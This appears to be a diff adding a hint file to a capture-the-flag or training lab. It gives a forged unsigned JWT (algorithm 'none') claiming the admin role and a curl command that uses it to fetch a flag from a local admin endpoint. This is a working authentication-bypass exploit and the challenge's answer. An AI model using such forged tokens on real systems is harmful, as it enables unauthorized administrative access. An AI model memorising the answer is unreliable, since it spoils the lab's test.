@@ -1,0 +1,7 @@
+💡 Hint: Complete Exploit
+
+Use this forged JWT:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6ImFkbWluIn0.
+
+curl -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6ImFkbWluIn0.' \
+  http://localhost:4004/api/admin/flag
